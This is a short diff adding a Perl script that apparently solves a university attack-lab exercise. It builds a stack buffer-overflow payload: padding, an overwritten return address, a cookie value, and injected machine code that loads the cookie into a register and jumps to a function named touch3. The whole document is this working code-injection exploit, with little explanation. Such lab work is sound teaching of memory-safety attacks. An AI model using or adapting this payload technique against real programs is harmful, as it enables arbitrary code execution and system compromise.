@@ -1,0 +1,9 @@
+$var =  "a"x40 . "\x84\xab\x62\x55" . "\x00"x4; # Padding and address for ret
+#$var = $var . "30783466343537633533"; # add in cookie string
+
+$var = $var . "4f457c53" . "\x00"x4;
+
+$var = $var . "\xbf\x78\xab\x62\x55"; # mov cookie into edi
+$var = $var . "\x68\x65\x1a\x40\x00"; # push address of touch3 onto stack
+$var = $var . "\xc3"; # ret code
+print $var 
